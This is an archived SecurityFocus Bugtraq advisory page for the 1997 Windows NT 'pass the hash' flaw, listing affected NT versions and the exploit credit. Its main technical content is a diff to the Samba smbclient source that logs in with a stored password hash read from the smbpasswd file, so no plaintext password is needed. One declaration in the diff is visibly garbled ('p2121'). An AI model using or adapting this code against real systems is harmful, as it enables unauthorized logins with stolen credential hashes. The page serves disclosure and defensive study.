#bid233<p><b><span style="font-size: 18pt;">NT "Pass the Hash" with Modified SMB Client Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/233/info">info</a><br><a href="http://www.securityfocus.com/bid/233/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/233/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/233/solution">solution</a><br><a href="http://www.securityfocus.com/bid/233/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				233
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Access Validation Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Unknown
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Apr 08 1997 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Apr 08 1997 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				This vulnerability and exploit code was posted to NBugtraq by Paul Ashton &lt;paul@EIGEN.CO.UK&gt;.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Microsoft Windows NT Terminal Server  4.0<br/>
					
				
					Microsoft Windows NT 3.5.1 SP5<br/>
					
				
					Microsoft Windows NT 3.5.1 SP4<br/>
					
				
					Microsoft Windows NT 3.5.1 SP3<br/>
					
				
					Microsoft Windows NT 3.5.1 SP2<br/>
					
				
					Microsoft Windows NT 3.5.1 SP1<br/>
					
				
					Microsoft Windows NT  4.0 SP5<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP5<br/>
</span>
					
				
					Microsoft Windows NT  4.0 SP4<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP4<br/>
</span>
					
				
					Microsoft Windows NT  4.0 SP3<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP3<br/>
</span>
					
				
					Microsoft Windows NT  4.0 SP2<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP2<br/>
</span>
					
				
					Microsoft Windows NT  4.0 SP1<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP1<br/>
</span>
					
				
					Microsoft Windows NT  4.0<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0<br/>
</span>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	*** orig_client.c       Tue Apr  8 17:27:29 1997<br/>--- client.c    Tue Apr  8 20:57:43 1997<br/>***************<br/>*** 3020,3026 ****<br/>    {-1,NULL}<br/>  };<br/><br/>-<br/>  /****************************************************************************<br/>  send a login command<br/>  ****************************************************************************/<br/>--- 3020,3025 ----<br/>***************<br/>*** 3039,3044 ****<br/>--- 3038,3061 ----<br/>    int numprots;<br/>    int tries=0;<br/><br/>+ #ifdef USESMBPASSWDFILE<br/>+ /*TODO check for valid password and uid = getuid */<br/>+   BOOL got_encpass;<br/>+   struct passwd *pwd;<br/>+   struct smb_passwd *smb_pass;<br/>+   unsigned char p2121;<br/>+<br/>+   memset(p21, 0, sizeof p21);<br/>+   pwd = getpwuid(getuid());<br/>+   if (pwd &amp;&amp; (smb_pass = get_smbpwnam(pwd-&gt;pw_name)))<br/>+   {<br/>+     strcpy(password, "not empty");<br/>+     got_pass = got_encpass = True;<br/>+     memcpy(p21, smb_pass-&gt;smb_passwd, 16);<br/>+   }<br/>+ setuid(getuid());<br/>+ #endif<br/>+<br/>    if (was_null)<br/>      {<br/>        inbuf = (char *)malloc(BUFFER_SIZE + SAFETY_MARGIN);<br/>***************<br/>*** 3189,3194 ****<br/>--- 3205,3215 ----<br/>        if (doencrypt &amp;&amp; *pass) {<br/>        DEBUG(3,("Using encrypted passwords\n"));<br/>        passlen = 24;<br/>+<br/>+ #ifdef USESMBPASSWDFILE<br/>+       if (got_encpass) E_P24(p21,cryptkey,pword);<br/>+       else<br/>+ #endif<br/>        SMBencrypt(pass,cryptkey,pword);<br/>        }<br/>  #else<br/>***************<br/>*** 3252,3257 ****<br/>--- 3273,3281 ----<br/>               (CVAL(inbuf,smb_rcls) == ERRSRV &amp;&amp;<br/>                SVAL(inbuf,smb_err) == ERRbadpw)))<br/>            {<br/>+ #ifdef USESMBPASSWDFILE<br/>+               got_encpass =<br/>+ #endif<br/>              got_pass = False;<br/>              DEBUG(3,("resending login\n"));<br/>              goto get_pass;
	
		<ul>
</ul>
</div>